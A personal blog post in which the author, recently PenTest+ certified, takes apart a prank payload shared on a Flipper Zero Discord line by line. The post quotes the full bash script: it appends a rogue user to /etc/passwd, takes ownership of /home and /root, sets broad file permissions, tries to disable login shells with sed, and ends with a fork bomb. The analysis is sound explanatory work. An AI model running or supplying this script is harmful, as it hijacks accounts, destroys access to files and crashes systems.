---
layout: post
title: process fork loop fun
category: blog
---

<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/soundcloud%253Atracks%253A1640397186&color=%23ff0000&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe><div style="font-size: 10px; color: #cccccc;line-break: anywhere;word-break: normal;overflow: hidden;white-space: nowrap;text-overflow: ellipsis; font-family: Interstate,Lucida Grande,Lucida Sans Unicode,Lucida Sans,Garuda,Verdana,Tahoma,sans-serif;font-weight: 100;"><a href="https://soundcloud.com/user-19969943" title="DJ Dingo Productions" target="_blank" style="color: #cccccc; text-decoration: none;">DJ Dingo Productions</a> · <a href="https://soundcloud.com/user-19969943/aphex-twin-quoth-hidden-mix" title="Polygon Window- Quoth (Hidden Mix) Remastered" target="_blank" style="color: #cccccc; text-decoration: none;">Polygon Window- Quoth (Hidden Mix) Remastered</a></div>

so today i was looking into one of the discord servers im in for flipper zero stuff. 
someone managed to create a `pinapple pager` payload that looks like this:

```bash
#!/bin/bash
echo -n "fuckyou:x:6669:6669:fuckyou:/home/fuckyou:/bin/ash" >> /etc/passwd
mkdir -p /home/fuckyou
chown -R fuckyou:fuckyou /home/
chown -R fuckyou:fuckyou /root/
chmod 600 ~/*
sed 's/\/bin\/bash\|/\/bin\/false/' /etc/passwd
sed 's/\/bin\/ash\|/\/bin\/false/' /etc/passwd
:(){ :|:& };:
```
![img](/assets/images/pic1.png)

> i do NOT recommend running this on your pager (if you have one)

so having completed the Pentest + exam recently, i wanted to understand this code line by line:

1) first line `echo -n "fuckyou:x:6669:fuckyou:/home/fuckyou:/bin/ash"`

- `echo -n` prints the text without trailing a new line
- `>> /etc/passwd` appendsa that text to the end of `/etc/passwd`
- this line is attempting to create a new local user account by directly writing a `passwd` record
    - fields can look like the following: `username:passwd_placeholder:UID:GID:comment:home:shell`


2) second line `mkdir -p /home/fuckyou`
- creates `/home/fuckyou`
- `-p` means create parents as needed, and don't error if it already exists.

3) third line `chown -R fuckyou:fuckyou /home/`
- recursively changes ownership of everything under `/home` to `fuckyou:fuckyou`
- every users home directory and files would be reassigned to that account 

4) fourth line `chown -R fuckyou:fuckyou /root/`
- recursively changes ownership of `/root/` to that `user/group` `(fuckyou:fuckyou)`

5) fifth line `chmod 600 ~/*`
- sets the permissions of non-hidden items in the current users directory to `600`
    - owner: read+write
    - group/others:none

6) sixth & seventh line 
```bash
sed 's/\/bin\/bash\|/\/bin\/false/' /etc/passwd
sed 's/\/bin\/ash\|/\/bin\/false/' /etc/passwd
```
- these are intended to replace login shells like `/bin/bash` or `/bin/ash` with `/bin/false` (common way to disable logins)

7) eighth line `:(){ :|:& };:`
- classic fork b*mb, it defines a function `:` that repeatedly spawns itself and pipes/spawns more copies quickly exhausting CPU/process limits making the system unresponsive. 

**conclusion**

- create a new local account by appending to `/etc/passwd`
- hijack ownership of `/home` and `/root`
- break user permissions with a broad chmod
- attempt to disable shells (poorly implemented)
- crash the system with runaway process creation

![img](/assets/images/pic2.png)
> though im sure this person is just trolling, still funny haha